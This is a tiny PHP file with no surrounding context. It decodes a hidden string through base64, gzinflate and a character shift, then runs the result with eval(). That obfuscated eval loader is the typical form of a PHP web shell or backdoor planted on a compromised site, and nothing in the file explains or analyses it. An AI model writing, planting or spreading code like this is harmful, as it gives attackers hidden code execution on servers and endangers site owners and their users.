<?php function foH($urbQg)
{ 
$urbQg=gzinflate(base64_decode($urbQg));
 for($i=0;$i<strlen($urbQg);$i++)
 {
$urbQg[$i] = chr(ord($urbQg[$i])-1);
 }
 return $urbQg;
 }eval(foH("U1QEAce08qRcTdWEwICQ0JjyOC0HewA="));?>